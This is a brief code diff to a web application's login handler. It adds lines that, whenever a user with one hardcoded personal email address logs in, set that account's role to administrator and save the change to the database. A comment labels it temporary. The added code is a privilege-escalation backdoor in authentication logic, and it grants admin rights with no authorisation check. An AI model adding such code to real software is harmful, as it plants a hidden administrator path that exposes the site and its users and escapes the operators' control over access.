@@ -61,7 +61,11 @@ def login_submit(
     db: Session = Depends(get_db)
 ):
     user = authenticate_user(db, email, password)
-
+    # TEMP: promote your account to admin
+    if user and user.email == "charliepb19@gmail.com":
+        user.role = "admin"
+        db.commit()
+        
     if not user:
         return templates.TemplateResponse(
             request,
